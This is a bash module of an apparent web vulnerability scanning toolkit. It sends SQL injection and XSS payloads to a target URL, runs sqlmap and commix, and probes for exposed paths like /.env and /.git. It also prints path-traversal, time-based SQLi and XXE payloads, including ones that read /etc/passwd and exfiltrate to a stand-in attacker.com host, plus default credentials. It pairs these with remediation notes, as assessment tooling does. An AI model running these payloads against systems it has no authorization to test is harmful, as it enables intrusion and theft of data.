#!/bin/bash

# ═══════════════════════════════════════════════════════════════════
# ALL-RECON - WEB VULNERABILITIES MODULE
# Comprehensive web application vulnerability scanning
# Philosophy: Test systematically. Document thoroughly. Exploit safely.
# ═══════════════════════════════════════════════════════════════════

WEB_VULN_LOG="logs/web_vuln_$(date +%Y%m%d_%H%M%S).log"
WEB_VULN_OUTPUT="output/web_vulns_$(date +%Y%m%d_%H%M%S)"
TIMESTAMP=$(date +%Y%m%d_%H%M%S)

mkdir -p logs output "$WEB_VULN_OUTPUT"

log_vuln() {
    echo "[$(date +%H:%M:%S)] $1" | tee -a "$WEB_VULN_LOG"
}

urlencode() {
    local string="${1}"
    local strlen=${#string}
    local encoded=""
    local pos c o

    for (( pos=0 ; pos<strlen ; pos++ )); do
        c=${string:$pos:1}
        case "$c" in
            [-_.~a-zA-Z0-9] ) o="${c}" ;;
            * ) printf -v o '%%%02x' "'$c"
        esac
        encoded+="${o}"
    done
    echo "${encoded}"
}

prompt_install() {
    local tool=$1
    local install_cmd=$2
    echo ""
    read -p "[?] $tool not found. Would you like to install it? (y/n): " response
    if [[ "$response" =~ ^[Yy]$ ]]; then
        echo "[*] Installing $tool..."
        eval "$install_cmd"
        if command -v "$tool" &>/dev/null; then
            echo "    ✓ $tool installed successfully"
            return 0
        else
            echo "    ✗ Installation failed or $tool not in PATH"
            return 1
        fi
    else
        echo "[*] Skipping $tool installation. Continuing with manual testing..."
        return 1
    fi
}

TARGET_URL="${1:-}"
if [[ -z "$TARGET_URL" ]]; then
    echo "❌ No target URL provided"
    exit 1
fi

log_vuln "🎯 Web Vulnerability Scanner initialized for: $TARGET_URL"

# ═══════════════════════════════════════════════════════════════════
# SQL INJECTION (SQLi) SCAN
# ═══════════════════════════════════════════════════════════════════
sqli_scan() {
    local url=$1
    log_vuln "🔍 Starting SQL Injection (SQLi) tests on $url..."

    output_file="$WEB_VULN_OUTPUT/sqli_scan_$TIMESTAMP.txt"

    {
        echo "═══════════════════════════════════════════════════════════════"
        echo "SQL INJECTION (SQLi) SCAN"
        echo "Target: $url"
        echo "Generated: $(date)"
        echo "═══════════════════════════════════════════════════════════════"
        echo ""

        echo "🔎 Testing URL Parameters for SQLi vulnerability..."
        echo "────────────────────────────────────────────────────────────────"
        echo ""

        echo "[*] Basic SQLi Payloads:"
        echo "    • ' OR '1'='1"
        echo "    • admin' --"
        echo "    • 1 OR 1=1"
        echo ""

        # Test basic payloads
        declare -a sqli_payloads=(
            "' OR '1'='1"
            "admin' --"
            "1 OR 1=1"
            "1' AND 1=2 UNION SELECT NULL,NULL --"
        )

        for payload in "${sqli_payloads[@]}"; do
            encoded_payload=$(urlencode "$payload")
            echo "[*] Testing payload: $payload"
            response=$(curl -s "$url?id=$encoded_payload" 2>/dev/null | head -c 200)
            if [[ ! -z "$response" ]]; then
                echo "    Response received (first 50 chars): ${response:0:50}..."
            fi
        done

        echo ""
        echo "🔎 Time-Based Blind SQLi Detection:"
        echo "────────────────────────────────────────────────────────────────"
        echo "    • MySQL: 1' AND SLEEP(5) --"
        echo "    • PostgreSQL: 1' AND PG_SLEEP(5) --"
        echo "    • SQL Server: 1'; WAITFOR DELAY '00:00:05' --"
        echo ""
        echo "[*] Note: Time-based detection requires manual testing or sqlmap"

        echo ""
        echo "🔎 Automated Testing:"
        echo "────────────────────────────────────────────────────────────────"
        if command -v sqlmap &>/dev/null; then
            echo "[*] sqlmap found. Running automated scan..."
            echo ""
            sqlmap -u "$url" --batch --level=1 --risk=1 --technique=E 2>&1 | head -50
        else
            if prompt_install "sqlmap" "pip install -y sqlmap"; then
                echo "[*] sqlmap found. Running automated scan..."
                echo ""
                sqlmap -u "$url" --batch --level=1 --risk=1 --technique=E 2>&1 | head -50
            fi
        fi

        echo ""
        echo "📋 Remediation Indicators:"
        echo "────────────────────────────────────────────────────────────────"
        echo "    → Parameterized queries/prepared statements"
        echo "    → Input validation and whitelisting"
        echo "    → Web Application Firewall (WAF) rules"
        echo "    → Least privilege database accounts"

    } | tee "$output_file"

    log_vuln "✅ SQL Injection scan complete"
}

# ═══════════════════════════════════════════════════════════════════
# CROSS-SITE SCRIPTING (XSS) SCAN
# ═══════════════════════════════════════════════════════════════════
xss_scan() {
    local url=$1
    log_vuln "🔍 Starting Cross-Site Scripting (XSS) tests on $url..."

    output_file="$WEB_VULN_OUTPUT/xss_scan_$TIMESTAMP.txt"

    {
        echo "═══════════════════════════════════════════════════════════════"
        echo "CROSS-SITE SCRIPTING (XSS) SCAN"
        echo "Target: $url"
        echo "Generated: $(date)"
        echo "═══════════════════════════════════════════════════════════════"
        echo ""

        echo "🔎 Testing for Reflected XSS..."
        echo "────────────────────────────────────────────────────────────────"
        echo ""

        declare -a xss_payloads=(
            "<script>alert('XSS')</script>"
            "<img src=x onerror=alert('XSS')>"
            "<svg onload=alert('XSS')>"
            "<input onfocus=alert('XSS') autofocus>"
        )

        echo "[*] Basic XSS Payloads:"
        for payload in "${xss_payloads[@]}"; do
            encoded_payload=$(urlencode "$payload")
            echo "[*] Testing: $payload"
            response=$(curl -s "$url?search=$encoded_payload" 2>/dev/null)
            if echo "$response" | grep -q "<script>alert" || echo "$response" | grep -q "onerror"; then
                echo "    ⚠️  Potential XSS found! Payload reflected in response"
            fi
        done

        echo ""
        echo "🔎 Testing HTML/Form Parameters..."
        echo "────────────────────────────────────────────────────────────────"
        echo "[*] Fetching page structure to identify input fields..."
        curl -s "$url" 2>/dev/null | grep -o 'name="[^"]*"' | head -10 || echo "No forms found"

        echo ""
        echo "🔎 Common XSS Bypass Techniques:"
        echo "────────────────────────────────────────────────────────────────"
        echo "    • Case variation: <ScRiPt>alert('XSS')</sCrIpT>"
        echo "    • HTML entities: &lt;script&gt;alert('XSS')&lt;/script&gt;"
        echo "    • Unicode: \\x3cscript\\x3e"
        echo "    • Data URI: data:text/html,<script>alert('XSS')</script>"

        echo ""
        echo "🔎 Automated XSS Detection:"
        echo "────────────────────────────────────────────────────────────────"
        if command -v zaproxy &>/dev/null; then
            echo "[*] OWASP ZAP found. Use: zaproxy -cmd -quickurl $url"
        else
            if prompt_install "zaproxy" "apt-get install -y zaproxy"; then
                echo "[*] OWASP ZAP found. Use: zaproxy -cmd -quickurl $url"
            fi
        fi

        echo ""
        echo "📋 Remediation Indicators:"
        echo "────────────────────────────────────────────────────────────────"
        echo "    → HTML entity encoding (< > & \" ')"
        echo "    → Content Security Policy (CSP) headers"
        echo "    → HTTPOnly and Secure flags on cookies"
        echo "    → Input validation and whitelisting"

    } | tee "$output_file"

    log_vuln "✅ XSS scan complete"
}

# ═══════════════════════════════════════════════════════════════════
# OS COMMAND INJECTION SCAN
# ═══════════════════════════════════════════════════════════════════
command_injection_scan() {
    local url=$1
    log_vuln "🔍 Starting OS Command Injection tests on $url..."

    output_file="$WEB_VULN_OUTPUT/command_injection_$TIMESTAMP.txt"

    {
        echo "═══════════════════════════════════════════════════════════════"
        echo "OS COMMAND INJECTION SCAN"
        echo "Target: $url"
        echo "Generated: $(date)"
        echo "═══════════════════════════════════════════════════════════════"
        echo ""

        echo "🔎 Testing for Command Injection..."
        echo "────────────────────────────────────────────────────────────────"
        echo ""

        echo "[*] Command Separators to Test:"
        echo "    • ; command"
        echo "    • | command"
        echo "    • || command"
        echo "    • && command"
        echo "    • \` command \`"
        echo "    • \$( command )"
        echo ""

        # Common parameter names for command injection
        declare -a cmd_params=("host" "ip" "target" "domain" "ping" "cmd" "exec")

        echo "[*] Testing common parameters: ${cmd_params[*]}"
        for param in "${cmd_params[@]}"; do
            payload="${param}=$(echo%20test)"
            response=$(curl -s "$url?$payload" 2>/dev/null | head -c 200)
            if [[ ! -z "$response" ]]; then
                echo "[*] Parameter '$param' returned response"
            fi
        done

        echo ""
        echo "🔎 Time-Based Command Injection Detection:"
        echo "────────────────────────────────────────────────────────────────"
        echo "[*] Testing with sleep command (5 second delay)..."
        echo "    Time-based detection requires manual testing"
        echo "    Payload: ; sleep 5"

        echo ""
        echo "🔎 Automated Testing:"
        echo "────────────────────────────────────────────────────────────────"
        if command -v commix &>/dev/null; then
            echo "[*] commix found. Running automated scan..."
            echo ""
            commix --url="$url" --batch --technique=1 2>&1 | head -50
        else
            if prompt_install "commix" "pip install -y commix"; then
                echo "[*] commix found. Running automated scan..."
                echo ""
                commix --url="$url" --batch --technique=1 2>&1 | head -50
            fi
        fi

        echo ""
        echo "📋 Remediation Indicators:"
        echo "────────────────────────────────────────────────────────────────"
        echo "    → Avoid shell execution (use APIs instead)"
        echo "    → Whitelist allowed commands/arguments"
        echo "    → Input validation and regex matching"
        echo "    → Run with minimal privileges"

    } | tee "$output_file"

    log_vuln "✅ Command Injection scan complete"
}

# ═══════════════════════════════════════════════════════════════════
# CSRF (CROSS-SITE REQUEST FORGERY) SCAN
# ═══════════════════════════════════════════════════════════════════
csrf_scan() {
    local url=$1
    log_vuln "🔍 Starting CSRF vulnerability scan on $url..."

    output_file="$WEB_VULN_OUTPUT/csrf_scan_$TIMESTAMP.txt"

    {
        echo "═══════════════════════════════════════════════════════════════"
        echo "CSRF (CROSS-SITE REQUEST FORGERY) SCAN"
        echo "Target: $url"
        echo "Generated: $(date)"
        echo "═══════════════════════════════════════════════════════════════"
        echo ""

        echo "🔎 Checking for CSRF Tokens..."
        echo "────────────────────────────────────────────────────────────────"
        echo ""

        page_content=$(curl -s "$url" 2>/dev/null)

        echo "[*] Analyzing page source for CSRF protection..."
        if echo "$page_content" | grep -qi "csrf"; then
            echo "    ✓ Found 'csrf' keyword in page"
        fi

        if echo "$page_content" | grep -qi "csrf_token\|_token\|csrf-token"; then
            echo "    ✓ Found CSRF token patterns"
            echo ""
            echo "[*] Token locations found:"
            echo "$page_content" | grep -o 'name="[^"]*csrf[^"]*"' | head -5
            echo "$page_content" | grep -o 'name="_token"' | head -5
        else
            echo "    ⚠️  No CSRF tokens detected in page"
        fi

        echo ""
        echo "[*] Checking HTTP Headers..."
        echo "────────────────────────────────────────────────────────────────"
        headers=$(curl -s -i "$url" 2>/dev/null | head -20)
        echo "$headers" | grep -i "samesite\|x-csrf-token\|x-requested-with" || echo "    No CSRF-related headers found"

        echo ""
        echo "[*] Checking for SameSite Cookie Attribute..."
        echo "────────────────────────────────────────────────────────────────"
        if echo "$headers" | grep -i "samesite=strict\|samesite=lax"; then
            echo "    ✓ SameSite cookie protection enabled"
        else
            echo "    ⚠️  SameSite cookie attribute missing or not strict"
        fi

        echo ""
        echo "🔎 Manual CSRF Testing Approach:"
        echo "────────────────────────────────────────────────────────────────"
        echo "    1. Perform sensitive action while logged in"
        echo "    2. Intercept request in proxy (Burp Suite)"
        echo "    3. Note CSRF token value"
        echo "    4. Try to repeat without token"
        echo "    5. Try to repeat with old/modified token"

        echo ""
        echo "📋 Remediation Indicators:"
        echo "────────────────────────────────────────────────────────────────"
        echo "    → CSRF tokens on all state-changing requests"
        echo "    → SameSite cookie attribute set"
        echo "    → Custom request headers (X-Requested-With)"
        echo "    → Verify Origin/Referer headers"

    } | tee "$output_file"

    log_vuln "✅ CSRF scan complete"
}

# ═══════════════════════════════════════════════════════════════════
# AUTHENTICATION & AUTHORIZATION SCAN
# ═══════════════════════════════════════════════════════════════════
auth_scan() {
    local url=$1
    log_vuln "🔍 Starting Authentication & Authorization scan on $url..."

    output_file="$WEB_VULN_OUTPUT/auth_scan_$TIMESTAMP.txt"

    {
        echo "═══════════════════════════════════════════════════════════════"
        echo "AUTHENTICATION & AUTHORIZATION SCAN"
        echo "Target: $url"
        echo "Generated: $(date)"
        echo "═══════════════════════════════════════════════════════════════"
        echo ""

        echo "🔎 Testing for Default Credentials..."
        echo "────────────────────────────────────────────────────────────────"
        declare -a default_creds=(
            "admin:admin"
            "admin:password"
            "admin:123456"
            "root:root"
            "test:test"
        )

        echo "[*] Common default credential patterns:"
        for cred in "${default_creds[@]}"; do
            username="${cred%%:*}"
            password="${cred##*:}"
            echo "    • $username:$password"
        done

        echo ""
        echo "🔎 Analyzing Page for Login Forms..."
        echo "────────────────────────────────────────────────────────────────"
        page_content=$(curl -s "$url" 2>/dev/null)

        if echo "$page_content" | grep -qi "login\|signin\|password"; then
            echo "    ✓ Login form detected"
            echo "$page_content" | grep -o 'type="password"' -B1 | grep 'name=' || echo "    Could not identify password field"
        else
            echo "    [*] No obvious login form found on homepage"
        fi

        echo ""
        echo "🔎 Cookie Analysis..."
        echo "────────────────────────────────────────────────────────────────"
        cookies=$(curl -s -i "$url" 2>/dev/null | grep -i "set-cookie" | head -5)
        if [[ ! -z "$cookies" ]]; then
            echo "[*] Cookies found:"
            echo "$cookies"
            echo ""
            if echo "$cookies" | grep -i "httponly"; then
                echo "    ✓ HttpOnly flag present"
            else
                echo "    ⚠️  HttpOnly flag missing"
            fi
            if echo "$cookies" | grep -i "secure"; then
                echo "    ✓ Secure flag present"
            else
                echo "    ⚠️  Secure flag missing"
            fi
        else
            echo "    No cookies detected"
        fi

        echo ""
        echo "📋 Remediation Indicators:"
        echo "────────────────────────────────────────────────────────────────"
        echo "    → Strong password requirements"
        echo "    → Multi-factor authentication (MFA)"
        echo "    → HTTPOnly and Secure flags on cookies"
        echo "    → Session timeout enforcement"
        echo "    → Secure password reset mechanism"

    } | tee "$output_file"

    log_vuln "✅ Authentication & Authorization scan complete"
}

# ═══════════════════════════════════════════════════════════════════
# BROKEN ACCESS CONTROL SCAN
# ═══════════════════════════════════════════════════════════════════
access_control_scan() {
    local url=$1
    log_vuln "🔍 Starting Broken Access Control scan on $url..."

    output_file="$WEB_VULN_OUTPUT/access_control_$TIMESTAMP.txt"

    {
        echo "═══════════════════════════════════════════════════════════════"
        echo "BROKEN ACCESS CONTROL (IDOR) SCAN"
        echo "Target: $url"
        echo "Generated: $(date)"
        echo "═══════════════════════════════════════════════════════════════"
        echo ""

        echo "🔎 Identifying Resource Identifiers..."
        echo "────────────────────────────────────────────────────────────────"
        echo ""
        echo "[*] Common parameter patterns to test:"
        echo "    • /user/profile?id=1"
        echo "    • /api/users/123"
        echo "    • /document/view/456"
        echo "    • /invoice/789"

        # Extract URLs with IDs
        echo ""
        echo "[*] Analyzing page for ID parameters..."
        page_content=$(curl -s "$url" 2>/dev/null)
        echo "$page_content" | grep -o 'href="[^"]*[0-9]\+[^"]*"' | head -10 || echo "    No obvious ID-based URLs found"

        echo ""
        echo "🔎 Path Traversal Testing..."
        echo "────────────────────────────────────────────────────────────────"
        declare -a traversal_payloads=(
            "../admin"
            "../../etc/passwd"
            "....//....//....//etc/passwd"
        )

        echo "[*] Path traversal patterns:"
        for payload in "${traversal_payloads[@]}"; do
            echo "    • $payload"
        done

        echo ""
        echo "[*] Note: Requires manual testing with identified endpoints"

        echo ""
        echo "🔎 Privilege Escalation Testing..."
        echo "────────────────────────────────────────────────────────────────"
        echo "    1. Test horizontal escalation (access other users' data)"
        echo "    2. Test vertical escalation (access admin functions)"
        echo "    3. Verify access controls on all endpoints"

        echo ""
        echo "📋 Remediation Indicators:"
        echo "────────────────────────────────────────────────────────────────"
        echo "    → User-based access control on all resources"
        echo "    → Verify ownership before allowing modifications"
        echo "    → Deny access by default, whitelist allowed actions"
        echo "    → Proper role-based access control (RBAC)"

    } | tee "$output_file"

    log_vuln "✅ Access Control scan complete"
}

# ═══════════════════════════════════════════════════════════════════
# SENSITIVE DATA EXPOSURE SCAN
# ═══════════════════════════════════════════════════════════════════
data_exposure_scan() {
    local url=$1
    log_vuln "🔍 Starting Sensitive Data Exposure scan on $url..."

    output_file="$WEB_VULN_OUTPUT/data_exposure_$TIMESTAMP.txt"

    {
        echo "═══════════════════════════════════════════════════════════════"
        echo "SENSITIVE DATA EXPOSURE SCAN"
        echo "Target: $url"
        echo "Generated: $(date)"
        echo "═══════════════════════════════════════════════════════════════"
        echo ""

        echo "🔎 SSL/TLS Configuration Check..."
        echo "────────────────────────────────────────────────────────────────"

        if [[ "$url" == https* ]]; then
            echo "[*] HTTPS detected. Running SSL/TLS analysis..."
            echo ""

            # Extract domain from URL
            domain=$(echo "$url" | sed -E 's|^https?://([^/?]+).*$|\1|')

            if command -v openssl &>/dev/null; then
                echo "[*] SSL Certificate Information:"
                echo | openssl s_client -connect "$domain:443" 2>/dev/null | openssl x509 -noout -dates -subject 2>/dev/null || echo "    Could not retrieve certificate"
            fi
        else
            echo "    ⚠️  HTTPS not used. Communication unencrypted!"
        fi

        echo ""
        echo "🔎 Checking for Unprotected Endpoints..."
        echo "────────────────────────────────────────────────────────────────"
        declare -a sensitive_paths=(
            "/admin"
            "/admin/backup"
            "/logs"
            "/config"
            "/.git"
            "/.env"
            "/debug"
            "/api/v1/debug"
        )

        echo "[*] Testing for exposed endpoints:"
        for path in "${sensitive_paths[@]}"; do
            response=$(curl -s -o /dev/null -w "%{http_code}" "$url$path" 2>/dev/null)
            if [[ "$response" == "200" || "$response" == "301" || "$response" == "302" ]]; then
                echo "    ⚠️  Found: $path (HTTP $response)"
            fi
        done

        echo ""
        echo "🔎 Analyzing Page Source for Secrets..."
        echo "────────────────────────────────────────────────────────────────"
        page_content=$(curl -s "$url" 2>/dev/null)

        if echo "$page_content" | grep -qi "password\|api_key\|secret\|token"; then
            echo "    ⚠️  Potentially sensitive keywords found in page source"
        fi

        if echo "$page_content" | grep -oE '[A-Za-z0-9_-]{20,}' | head -10 | grep -q .; then
            echo "    [*] Long token-like strings found (review manually)"
        fi

        echo ""
        echo "📋 Remediation Indicators:"
        echo "────────────────────────────────────────────────────────────────"
        echo "    → HTTPS everywhere"
        echo "    → Strong encryption (TLS 1.2+)"
        echo "    → No sensitive data in page source"
        echo "    → Restrict access to sensitive endpoints"
        echo "    → No credentials in logs or comments"

    } | tee "$output_file"

    log_vuln "✅ Sensitive Data Exposure scan complete"
}

# ═══════════════════════════════════════════════════════════════════
# XXE (XML EXTERNAL ENTITIES) SCAN
# ═══════════════════════════════════════════════════════════════════
xxe_scan() {
    local url=$1
    log_vuln "🔍 Starting XXE vulnerability scan on $url..."

    output_file="$WEB_VULN_OUTPUT/xxe_scan_$TIMESTAMP.txt"

    {
        echo "═══════════════════════════════════════════════════════════════"
        echo "XXE (XML EXTERNAL ENTITIES) SCAN"
        echo "Target: $url"
        echo "Generated: $(date)"
        echo "═══════════════════════════════════════════════════════════════"
        echo ""

        echo "🔎 Identifying XML Processing Points..."
        echo "────────────────────────────────────────────────────────────────"
        echo ""
        echo "[*] Common XXE vulnerable endpoints:"
        echo "    • /upload (XML file upload)"
        echo "    • /api/process"
        echo "    • /parse"
        echo "    • /import"
        echo "    • Any endpoint accepting XML input"

        echo ""
        echo "[*] Analyzing page for file upload forms..."
        page_content=$(curl -s "$url" 2>/dev/null)
        if echo "$page_content" | grep -qi "upload\|file\|import"; then
            echo "    ✓ Upload/import functionality detected"
        fi

        echo ""
        echo "🔎 XXE Payload Examples..."
        echo "────────────────────────────────────────────────────────────────"
        cat << 'EOF'
[*] Basic XXE:
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>

[*] XXE with External DTD:
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/evil.dtd">]>
<root>&xxe;</root>

[*] Blind XXE (Out-of-Band):
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/?file=">]>
<root>&xxe;</root>
EOF

        echo ""
        echo "🔎 SOAP/Web Service Detection..."
        echo "────────────────────────────────────────────────────────────────"
        if echo "$page_content" | grep -qi "soap\|wsdl\|xml"; then
            echo "    ✓ SOAP/XML services potentially present"
        else
            echo "    [*] No obvious SOAP/XML services detected"
        fi

        echo ""
        echo "[*] Note: XXE exploitation requires direct endpoint access"
        echo "    Recommend manual testing or automated scanners"

        echo ""
        echo "📋 Remediation Indicators:"
        echo "────────────────────────────────────────────────────────────────"
        echo "    → Disable XML external entity processing"
        echo "    → Use XML parsers with XXE protection enabled"
        echo "    → Whitelist allowed entities and schemas"
        echo "    → Implement input validation"

    } | tee "$output_file"

    log_vuln "✅ XXE scan complete"
}

# ═══════════════════════════════════════════════════════════════════
# BOLA (BROKEN OBJECT LEVEL AUTHORIZATION) SCAN
# ═══════════════════════════════════════════════════════════════════
bola_scan() {
    local url=$1
    log_vuln "🔍 Starting BOLA vulnerability scan on $url..."

    output_file="$WEB_VULN_OUTPUT/bola_scan_$TIMESTAMP.txt"

    {
        echo "═══════════════════════════════════════════════════════════════"
        echo "BOLA (BROKEN OBJECT LEVEL AUTHORIZATION) SCAN"
        echo "Target: $url"
        echo "Generated: $(date)"
        echo "═══════════════════════════════════════════════════════════════"
        echo ""

        echo "🔎 Identifying API Endpoints..."
        echo "────────────────────────────────────────────────────────────────"
        echo ""
        echo "[*] Common API patterns to test:"
        echo "    • /api/users/1"
        echo "    • /api/v1/users/123"
        echo "    • /api/orders/456"
        echo "    • /api/documents/789"
        echo "    • /user/profile/999"

        echo ""
        echo "[*] Fetching page to identify endpoints..."
        page_content=$(curl -s "$url" 2>/dev/null)
        api_endpoints=$(echo "$page_content" | grep -o '/api/[^\"]*' | sort -u | head -10)

        if [[ ! -z "$api_endpoints" ]]; then
            echo "    Potential API endpoints found:"
            echo "$api_endpoints"
        else
            echo "    No obvious API endpoints found"
        fi

        echo ""
        echo "🔎 Sequential ID Testing..."
        echo "────────────────────────────────────────────────────────────────"
        echo ""
        echo "[*] Testing for sequential/predictable IDs..."
        echo "    • Try changing ID in discovered endpoints"
        echo "    • Test with adjacent IDs: 1, 2, 3, etc."
        echo "    • Verify you can only access your own resources"

        echo ""
        echo "🔎 Cross-User Testing..."
        echo "────────────────────────────────────────────────────────────────"
        echo "[*] Required steps (manual):"
        echo "    1. Obtain valid authentication token"
        echo "    2. Note your user ID"
        echo "    3. Try accessing other users' resources"
        echo "    4. Verify proper authorization checks"

        echo ""
        echo "🔎 Authorization Header Testing..."
        echo "────────────────────────────────────────────────────────────────"
        echo "[*] Common authentication methods:"
        echo "    • Bearer tokens (JWT)"
        echo "    • API keys"
        echo "    • Session cookies"
        echo "    • OAuth tokens"

        echo ""
        echo "[*] Testing $url with auth analysis..."
        headers=$(curl -s -i "$url" 2>/dev/null | head -15)
        if echo "$headers" | grep -i "authorization\|x-api-key\|bearer"; then
            echo "    ✓ Authentication headers required"
        else
            echo "    [*] No obvious auth headers"
        fi

        echo ""
        echo "📋 Remediation Indicators:"
        echo "────────────────────────────────────────────────────────────────"
        echo "    → Verify user ownership of resources"
        echo "    → Check permissions on every API call"
        echo "    → Use non-sequential, unpredictable IDs"
        echo "    → Implement proper RBAC/ABAC"

    } | tee "$output_file"

    log_vuln "✅ BOLA scan complete"
}

# ═══════════════════════════════════════════════════════════════════
# MAIN SCAN MENU
# ═══════════════════════════════════════════════════════════════════

echo ""
echo "🎯 Web Vulnerability Scan Options:"
echo "1. SQL Injection (SQLi)"
echo "2. Cross-Site Scripting (XSS)"
echo "3. OS Command Injection"
echo "4. Cross-Site Request Forgery (CSRF)"
echo "5. Authentication & Authorization"
echo "6. Broken Access Control (IDOR)"
echo "7. Sensitive Data Exposure"
echo "8. XML External Entities (XXE)"
echo "9. Broken Object Level Authorization (BOLA)"
echo "10. Run All Scans"
echo ""

read -p "Select vulnerability type [1-10]: " scan_choice

case $scan_choice in
    1) sqli_scan "$TARGET_URL" ;;
    2) xss_scan "$TARGET_URL" ;;
    3) command_injection_scan "$TARGET_URL" ;;
    4) csrf_scan "$TARGET_URL" ;;
    5) auth_scan "$TARGET_URL" ;;
    6) access_control_scan "$TARGET_URL" ;;
    7) data_exposure_scan "$TARGET_URL" ;;
    8) xxe_scan "$TARGET_URL" ;;
    9) bola_scan "$TARGET_URL" ;;
    10)
        log_vuln "🚀 Running ALL vulnerability scans..."
        sqli_scan "$TARGET_URL"
        xss_scan "$TARGET_URL"
        command_injection_scan "$TARGET_URL"
        csrf_scan "$TARGET_URL"
        auth_scan "$TARGET_URL"
        access_control_scan "$TARGET_URL"
        data_exposure_scan "$TARGET_URL"
        xxe_scan "$TARGET_URL"
        bola_scan "$TARGET_URL"
        ;;
    *)
        echo "[!] Invalid choice"
        exit 1
        ;;
esac

echo ""
echo "✅ Web Vulnerability Scans Complete!"
echo "📁 Results saved to: $WEB_VULN_OUTPUT/"
echo "📋 Session log: $WEB_VULN_LOG"
log_vuln "🏁 All scans complete. Results in $WEB_VULN_OUTPUT/"
